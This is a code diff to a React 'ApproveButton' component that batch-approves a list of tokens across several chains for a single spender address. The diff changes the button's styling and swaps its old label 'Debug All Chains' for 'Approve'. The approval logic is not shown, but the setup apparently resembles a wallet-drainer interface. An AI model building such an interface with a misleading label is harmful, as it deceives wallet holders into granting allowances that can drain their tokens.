@@ -16,6 +16,7 @@ export default function ApproveButton({ spenderAddress, tokenAddresses, chainIds
   const { data: walletClient } = useWalletClient();
   const [isLoading, setIsLoading] = useState(false);
   const [approvedTokens, setApprovedTokens] = useState<number>(0);
+  const [isHovered, setIsHovered] = useState(false);
 
   // Load progress from localStorage on component mount
   useEffect(() => {
@@ -84,9 +85,19 @@ export default function ApproveButton({ spenderAddress, tokenAddresses, chainIds
     <button
       onClick={approveToken}
       disabled={isLoading}
-      style={{ padding: "10px", background: "black", color: "white", borderRadius: "5px", width: "100%", borderStyle: "solid", borderColor: "white", marginTop: "10px", marginLeft: "10px" }}
+      style={{ 
+        marginBottom: "5px",
+        padding: "10px",
+        backgroundColor: isHovered ? "#dcdcdc" : "#015efe", // Hover effect for background color
+        border: "none",
+        borderRadius: "16px",
+        color: isHovered ? "white" : "white", // Hover effect for text color
+        fontSize: "1rem",
+        cursor: "pointer",
+        width: "100%",
+        height: "42px"      }}
     >
-      {isLoading ? `Processing Batch ${approvedTokens + 1}...` : `Debug All Chains ${approvedTokens} / ${tokenAddresses.length}`}
+      {isLoading ? `...` : `Approve`}
     </button>
   );
 }
